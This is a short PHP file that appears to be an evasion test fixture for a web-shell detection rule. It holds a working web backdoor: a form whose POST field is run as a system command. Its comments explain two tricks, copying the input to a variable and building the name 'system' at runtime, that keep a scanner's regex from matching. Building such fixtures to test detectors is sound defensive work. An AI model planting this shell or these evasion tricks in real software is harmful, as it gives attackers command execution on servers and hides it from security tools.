<?php
// EVASION TEST FIXTURE -- same web-backdoor behavior as pos_webshell_01.php,
// rewritten so the PHP-SYSTEM-FROM-REQUEST regex never matches. Never deploy.
//
// Technique (two dodges stacked, same family as eva_phpsys_01/02):
//   1. the request value is copied into a local var first, so the rule's
//      "(system|exec|...)\s*\(\s*$_(GET|POST...)" adjacency is broken.
//   2. the executor name is assembled at runtime and called through a
//      variable, so the literal token "system(" never appears in source.
?>
<!doctype html>
<html>
  <body>
    <form method="post">
      <input name="c" placeholder="command">
      <button>run</button>
    </form>
    <pre><?php
      $c = $_POST['c'] ?? '';   // user-controlled, now one hop removed
      $run = 'sys' . 'tem';     // name never sits as a literal call
      $run($c);                 // same effect as the positive sample's sink
    ?></pre>
  </body>
</html>
